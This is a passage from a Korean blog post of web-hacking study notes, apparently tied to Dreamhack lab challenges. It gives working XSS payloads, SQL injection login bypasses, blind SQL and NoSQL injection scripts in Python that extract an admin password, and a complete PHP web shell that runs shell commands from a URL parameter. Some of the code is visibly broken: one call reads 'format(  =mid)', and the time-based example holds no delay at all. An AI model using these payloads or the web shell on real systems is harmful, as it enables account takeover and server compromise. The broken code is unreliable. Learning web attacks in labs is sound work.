</code></pre></li><li><p>File Download Vulnerability</p><ul><li>파일 이름을 직접 입력 받아 임의 디렉터리에 있는 파일을 다운로드 받을 수 있는 취약점이다.</li><li>이용자가 다운로드할 파일의 이름을 임의로 정할 수 있을 때 발생한다.</li></ul></li></ol><ul><li>File Vulnerability 를 방지하려면<ul><li>정규식을 통해 확장자, 메타문자를 필터링 하는 로직을 사용해 방어가 필요하다.</li><li>업로드 디렉터리를 웹 서버에서 직접 접근할 수 없도록 한다.</li><li>업로드 디렉터리에서는 CGI가 실행되지 않도록 한다.</li><li>다운로드 파일의 이름 대신 파일의 고유 ID를 사용하여 접근하도록 시스템을 구성한다.</li></ul></li></ul><h1 id=공격-기법>공격 기법<a hidden class=anchor aria-hidden=true href=#공격-기법>#</a></h1><ol><li>innerHTML 을 통한 XSS 취약점 공격</li></ol><ul><li>조건: 사용자의 입력을 출력하는 형태를 지닌 시스템</li><li>방법: <code>&lt;script></code> 태그와 공격용 javascript 를 url 파라미터 혹은 request 에 포함시켜 공격용 javascript 가 실행되게 한다.</li><li>예시)<ul><li>서버의 코드<pre tabindex=0><code>@app.route(&#34;/vulnerable&#34;)
def vulnerable():
    param = request.args.get(&#34;param&#34;, &#34;&#34;) # 이용자가 입력한 인자를 가져옴
    return param # 이용자의 입력값을 화면 상에 표시
</code></pre></li><li>공격자 입력1. 다른 페이지로 redirection<pre tabindex=0><code>&lt;script&gt;location.href = &#34;/another_page?param=PARAM1&#34;;&lt;/script&gt;
</code></pre></li><li>공격자 입력2. cookie 정보 출력<pre tabindex=0><code>&lt;script&gt;document.cookie&lt;/script&gt;
</code></pre></li></ul></li></ul><ol start=2><li><p>innerHTML 을 통한 XSS 취약점 공격2</p><ul><li>&lt;script> 태그 없이 javascript를 실행시키는 방법</li><li>조건 : 서버에 기본적인 XSS 방지 기법이 적용되어 &lt;script> 태그를 주입시킬 수 없는 경우 (ex: render_template 를 사용한 경우)</li><li>방법 : <code>&lt;image></code> 태그의 <code>onerror</code> 필드에 script를 주입한다.</li><li><a href=https://developer.mozilla.org/en-US/docs/Web/API/Element/innerHTML#security_considerations>참조</a></li><li>예시)<ul><li>동작하지 않는 script(XSS공격 실패)<pre tabindex=0><code>name = &#34;&lt;script&gt;alert(&#39;I am John in an annoying alert!&#39;)&lt;/script&gt;&#34;;
el.innerHTML = name; // harmless in this case
</code></pre></li><li>동작하는 script (XSS공격 성공)<pre tabindex=0><code>const name = &#34;&lt;img src=&#39;x&#39; onerror=&#39;alert(1)&#39;&gt;&#34;;
el.innerHTML = name; // shows the alert
# x라는 경로에 이미지가 없어서 onerror 로 설정된 javascript가 실행된다.
</code></pre></li></ul></li></ul></li><li><p>SQL Injection</p></li></ol><ul><li>조건 : client 인터페이스에서 서버에서 동작할 SQL 쿼리 값을 조작할 수 있다.</li><li>아래 쿼리를 SQL Injection으로 공격하고자 한다면<pre tabindex=0><code>SELECT * FROM users WHERE userid=&#34;{userid}&#34; AND userpassword=&#34;{userpassword}&#34;;
</code></pre></li><li>userid 변수와 userpassword 에 아래와 같은 값이 들어가게 입력을 조작하면 &lsquo;admin&rsquo; 계정을 탈취할 수 있다.<pre tabindex=0><code>/*
ID: admin&#34;--, PW: DUMMY
userid 검색 조건만을 처리하도록, 뒤의 내용은 주석처리하는 방식
*/
SELECT * FROM users WHERE userid=&#34;admin&#34;-- &#34; AND userpassword=&#34;DUMMY&#34;

/*
ID: admin&#34; or &#34;1 , PW: DUMMY
userid 검색 조건 뒤에 OR (또는) 조건을 추가하여 뒷 내용이 무엇이든, admin 이 반환되도록 하는 방식
*/
SELECT * FROM users WHERE userid=&#34;admin&#34; or &#34;1&#34; AND userpassword=&#34;DUMMY&#34;

/*
ID: admin, PW: DUMMY&#34; or userid=&#34;admin
userid 검색 조건에 admin을 입력하고, userpassword 조건에 임의 값을 입력한 뒤 or 조건을 추가하여 userid가 admin인 것을 반환하도록 하는 방식
*/
SELECT * FROM users WHERE userid=&#34;admin&#34; AND userpassword=&#34;DUMMY&#34; or userid=&#34;admin&#34;

/*
ID: &#34; or 1 LIMIT 1,1-- , PW: DUMMY
userid 검색 조건 뒤에 or 1을 추가하여, 테이블의 모든 내용을 반환토록 하고 LIMIT 절을 이용해 두 번째 Row인 admin을 반환토록 하는 방식
*/
SELECT * FROM users WHERE userid=&#34;&#34; or 1 LIMIT 1,1-- &#34; AND userpassword=&#34;DUMMY&#34;
</code></pre></li></ul><ol start=4><li>Blind SQL Injection</li></ol><ul><li>글자 위치 추론<pre tabindex=0><code># 첫 번째 글자 구하기
SELECT * FROM user_table WHERE uid=&#39;admin&#39; and substr(upw,1,1)=&#39;a&#39;-- &#39; and upw=&#39;&#39;; # False
SELECT * FROM user_table WHERE uid=&#39;admin&#39; and substr(upw,1,1)=&#39;b&#39;-- &#39; and upw=&#39;&#39;; # True
# 두 번째 글자 구하기
SELECT * FROM user_table WHERE uid=&#39;admin&#39; and substr(upw,2,1)=&#39;d&#39;-- &#39; and upw=&#39;&#39;; # False
SELECT * FROM user_table WHERE uid=&#39;admin&#39; and substr(upw,2,1)=&#39;e&#39;-- &#39; and upw=&#39;&#39;; # True 
</code></pre></li><li>python 자동화<pre tabindex=0><code>#!/usr/bin/python3
import requests
import string
# example URL
url = &#39;http://example.com/login&#39;
params = {
    &#39;uid&#39;: &#39;&#39;,
    &#39;upw&#39;: &#39;&#39;
}
# ascii printables
tc = string.printable
# 사용할 SQL Injection 쿼리
query = &#39;&#39;&#39;admin&#39; and substr(upw,{idx},1)=&#39;{val}&#39;-- &#39;&#39;&#39;
password = &#39;&#39;
# 비밀번호 길이는 20자 이하라 가정
for idx in range(0, 20):
    for ch in tc:
        # query를 이용하여 Blind SQL Injection 시도
        params[&#39;uid&#39;] = query.format(idx=idx+1, val=ch).strip(&#34;\n&#34;)
        c = requests.get(url, params=params)
        print(c.request.url)
        # 응답에 Login success 문자열이 있으면 해당 문자를 password 변수에 저장
        if c.text.find(&#34;Login success&#34;) != -1:
            password += ch
            break
print(f&#34;Password is {password}&#34;)
</code></pre></li><li>비밀번호 길이 추론 및 확인<ul><li>비밀번호 길이 체크 핵심 : <code>f"((SELECT LENGTH(userpassword) WHERE userid=\"{user}\")&lt;{{val}})"</code></li><li>비밀번호 확인 핵심 : <code>f'((SELECT SUBSTR(userpassword,{idx},1) WHERE userid="{user}") &lt; CHAR({{val}}))'</code></li></ul></li><li>python 코드<pre tabindex=0><code>#!/usr/bin/python3
import requests
import sys
from urllib.parse import urljoin


class Solver:
    &#34;&#34;&#34;Solver for simple_SQLi challenge&#34;&#34;&#34;

    # initialization
    def __init__(self, port: str) -&gt; None:
        self._chall_url = f&#34;http://host1.dreamhack.games:{port}&#34;
        self._login_url = urljoin(self._chall_url, &#34;login&#34;)

    # base HTTP methods
    def _login(self, userid: str, userpassword: str) -&gt; requests.Response:
        login_data = {&#34;userid&#34;: userid, &#34;userpassword&#34;: userpassword}
        resp = requests.post(self._login_url, data=login_data)
        return resp

    # base sqli methods
    def _sqli(self, query: str) -&gt; requests.Response:
        resp = self._login(f&#39;&#34; or {query}-- &#39;, &#34;hi&#34;)
        return resp

    def _sqli_lt_binsearch(self, query_tmpl: str, low: int, high: int) -&gt; int:
        while 1:
            mid = (low + high) // 2
            if low + 1 &gt;= high:
                break
            query = query_tmpl.format(  =mid)
            if &#34;hello&#34; in self._sqli(query).text:
                high = mid
            else:
                low = mid
        return mid

    # attack methods
    def _find_password_length(self, user: str, max_pw_len: int = 100) -&gt; int:
        query_tmpl = f&#39;((SELECT LENGTH(userpassword) WHERE userid=&#34;{user}&#34;) &lt; {{val}})&#39;
        pw_len = self._sqli_lt_binsearch(query_tmpl, 0, max_pw_len)
        return pw_len

    def _find_password(self, user: str, pw_len: int) -&gt; str:
        pw = &#34;&#34;
        for idx in range(1, pw_len + 1):
            query_tmpl = f&#39;((SELECT SUBSTR(userpassword,{idx},1) WHERE userid=&#34;{user}&#34;) &lt; CHAR({{val}}))&#39;
            pw += chr(self._sqli_lt_binsearch(query_tmpl, 0x2F, 0x7E))
            print(f&#34;{idx}. {pw}&#34;)
        return pw

    def solve(self) -&gt; None:
        # Find the length of admin password
        pw_len = self._find_password_length(&#34;admin&#34;)
        print(f&#34;Length of the admin password is: {pw_len}&#34;)
        # Find the admin password
        print(&#34;Finding password:&#34;)
        pw = self._find_password(&#34;admin&#34;, pw_len)
        print(f&#34;Password of the admin is: {pw}&#34;)


if __name__ == &#34;__main__&#34;:
    port = sys.argv[1]
    solver = Solver(port)
    solver.solve()
</code></pre></li></ul><ol start=5><li>Blind NoSQL Injection</li></ol><ul><li>조건: url로 NoSQL 인자로 object 타입을 대입할 수 있다.</li><li>다음은 MongoDB를 사용하는 시스템에 대한 공격 예시이다.</li><li><code>$regex</code> 구문을 사용하여 문자의 시작 &lsquo;upw&rsquo; 키워드의 첫 글자 확인하는 쿼리<pre tabindex=0><code># http://SERVER_URL?upw[$regex]=^a
&gt; db.user.find({upw: {$regex: &#34;^a&#34;}})
&gt; db.user.find({upw: {$regex: &#34;^b&#34;}})
&gt; db.user.find({upw: {$regex: &#34;^c&#34;}})
...
&gt; db.user.find({upw: {$regex: &#34;^g&#34;}})
{ &#34;_id&#34; : ObjectId(&#34;5ea0110b85d34e079adb3d19&#34;), &#34;uid&#34; : &#34;guest&#34;, &#34;upw&#34; : &#34;guest&#34; }
</code></pre></li><li><code>$where</code> 와 <code>substring</code> 조합을 활용해 첫 글자를 비교하는 방법<pre tabindex=0><code>&gt; db.user.find({$where: &#34;this.upw.substring(0,1)==&#39;a&#39;&#34;})
&gt; db.user.find({$where: &#34;this.upw.substring(0,1)==&#39;b&#39;&#34;})
&gt; db.user.find({$where: &#34;this.upw.substring(0,1)==&#39;c&#39;&#34;})
...
&gt; db.user.find({$where: &#34;this.upw.substring(0,1)==&#39;g&#39;&#34;})
{ &#34;_id&#34; : ObjectId(&#34;5ea0110b85d34e079adb3d19&#34;), &#34;uid&#34; : &#34;guest&#34;, &#34;upw&#34; : &#34;guest&#34; }
</code></pre></li><li>위 조건문을 포함한 쿼리를 DB에 주입시키고 쿼리 실행 결과가 참이라면 공격자가 알아볼 수 있는 동작을 발생시켜야 한다.<ol><li>Time based Injection<ul><li>MongoDB 의 sleep 함수를 사용하여 응답지연 혹은 timeout을 유발시킨다.</li></ul><pre tabindex=0><code>&gt; db.user.find({$where: &#34;this.upw.substring(0,1)==&#39;a&#39;&#34;})
&gt; db.user.find({$where: &#34;this.upw.substring(0,1)==&#39;b&#39;&#34;})
&gt; db.user.find({$where: &#34;this.upw.substring(0,1)==&#39;c&#39;&#34;})
...
&gt; db.user.find({$where: &#34;this.upw.substring(0,1)==&#39;g&#39;&#34;})
{ &#34;_id&#34; : ObjectId(&#34;5ea0110b85d34e079adb3d19&#34;), &#34;uid&#34; : &#34;guest&#34;, &#34;upw&#34; : &#34;guest&#34; }
</code></pre></li><li>Error based Injection<ul><li>고의로 문법에 맞지않는 구문을 넣어 에러를 발생시킨다.</li></ul><pre tabindex=0><code>&gt; db.user.find({$where: &#34;this.uid==&#39;guest&#39;&amp;&amp;this.upw.substring(0,1)==&#39;g&#39;&amp;&amp;asdf&#34;});
</code></pre><ul><li>asdf 라는 에러가 발생</li></ul></li></ol></li><li>python 자동화 코드<ul><li>알파벳의 한 글자씩 &lsquo;ch&rsquo; 변수에 대입하여 전체 &lsquo;flag&rsquo; 를 찾아가는 과정. 비밀번호 포멧이 D?{} 형태임을 알고 있다는 가정 하에 구현</li></ul><pre tabindex=0><code>import requests, string

HOST = &#39;http://localhost&#39;
ALPHANUMERIC = string.digits + string.ascii_letters
SUCCESS = &#39;admin&#39;

flag = &#39;&#39;

for i in range(32):
    for ch in ALPHANUMERIC:
        response = requests.get(f&#39;{HOST}/login?uid[$regex]=ad.in&amp;upw[$regex]=D.{{{flag}{ch}&#39;)
        if response.text == SUCCESS:
            flag += ch
            break

    print(f&#39;FLAG: DH{{{flag}}}&#39;)
</code></pre></li></ul><ol start=6><li>File Vulnerability</li></ol><ul><li>조건: 임의의 파일을 서버에 업로드하고, 로드할 수 있다.</li><li>아래는 php 의 Web shell 코드 예시이다. 아래를 <code>.php</code> 확장자로 생성하여 서버에 업로드하고, 서버에서 해당 파일을 로드하도록 유도하면 <a href=../web/#CGI-(Common-Gateway-Interface)>CGI</a> 에 의해 서버에서 shell 명령어를 동작시킬 수 있다.</li></ul><pre tabindex=0><code>&lt;html&gt;&lt;body&gt;
&lt;form method=&#34;GET&#34; name=&#34;&lt;?php echo basename($_SERVER[&#39;PHP_SELF&#39;]); ?&gt;&#34;&gt;
&lt;input type=&#34;TEXT&#34; name=&#34;cmd&#34; autofocus id=&#34;cmd&#34; size=&#34;80&#34;&gt;
&lt;input type=&#34;SUBMIT&#34; value=&#34;Execute&#34;&gt;
&lt;/form&gt;&lt;pre&gt;
&lt;?php
    if(isset($_GET[&#39;cmd&#39;]))
    {
        system($_GET[&#39;cmd&#39;]);
    }
?&gt;&lt;/pre&gt;&lt;/body&gt;&lt;/html&gt;
</code></pre><ol start=7><li></li></ol></div><footer class=post-footer><ul class=post-tags></ul><nav class=paginav><a class=prev href=https://aswinblue.github.io/Blog/post/databases/database/><span class=title>« Prev</span><br><span>Database</span></a>
<a class=next href=https://aswinblue.github.io/Blog/post/projects/youtube_downloader/><span class=title>Next »</span><br><span>Youtube Downloader</span></a></nav><div class=share-buttons><a target=_blank rel="noopener noreferrer" aria-label="share Exploit on twitter" href="https://twitter.com/intent/tweet/?text=Exploit&amp;url=https%3a%2f%2faswinblue.github.io%2fBlog%2fpost%2fwebhacking%2fexploit%2f&amp;hashtags="><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Exploit on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2faswinblue.github.io%2fBlog%2fpost%2fwebhacking%2fexploit%2f&amp;title=Exploit&amp;summary=Exploit&amp;source=https%3a%2f%2faswinblue.github.io%2fBlog%2fpost%2fwebhacking%2fexploit%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Exploit on reddit" href="https://reddit.com/submit?url=https%3a%2f%2faswinblue.github.io%2fBlog%2fpost%2fwebhacking%2fexploit%2f&title=Exploit"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Exploit on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2faswinblue.github.io%2fBlog%2fpost%2fwebhacking%2fexploit%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Exploit on whatsapp" href="https://api.whatsapp.com/send?text=Exploit%20-%20https%3a%2f%2faswinblue.github.io%2fBlog%2fpost%2fwebhacking%2fexploit%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Exploit on telegram" href="https://telegram.me/share/url?text=Exploit&amp;url=https%3a%2f%2faswinblue.github.io%2fBlog%2fpost%2fwebhacking%2fexploit%2f"><svg viewBox="2 2 28 28" height="30" width="30" fill="currentcolor"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></div></footer></article></main><div class=auto-hide-div><ins class=kakao_ad_area style=display:none;position:fixed data-ad-unit=DAN-17Lk24lxFVgxtePU data-ad-width=160 data-ad-height=auto></ins></div><script type=text/javascript src=//t1.daumcdn.net/kas/static/ba.min.js async></script></div><footer class=footer><span>&copy; 2025 <a href=https://aswinblue.github.io/Blog>AswinBlue</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>